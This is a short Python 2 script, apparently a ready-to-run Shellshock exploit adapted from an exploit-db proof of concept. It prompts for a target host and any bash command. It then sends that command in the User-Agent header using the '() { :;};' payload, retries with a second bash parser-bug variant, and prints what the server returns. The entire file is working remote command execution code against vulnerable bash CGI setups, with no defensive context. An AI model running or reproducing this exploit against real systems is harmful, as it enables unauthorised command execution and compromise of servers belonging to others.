#!/usr/bin/env python

#Idea: make it simple.

import urllib2
import sys
import readline

#Follwing the PoC from Prakhar Prasad && Subho Halder
#http://www.exploit-db.com/exploits/34766/

hostname = raw_input("Enter host: ")
cmmd = raw_input("Enter bash command: ")

try:
  req = urllib2.Request(hostname, headers={ 'User-Agent': '() { :;}; '+cmmd })
  html = urllib2.urlopen(req).read()
  print html
except urllib2.HTTPError:
  try:
    req = urllib2.Request(hostname, headers={ 'User-Agent': '() { (a)=>\ '+cmmd })
    html = urllib2.urlopen(req).read()
    print html
  except:
    exit("Could not exploit!")
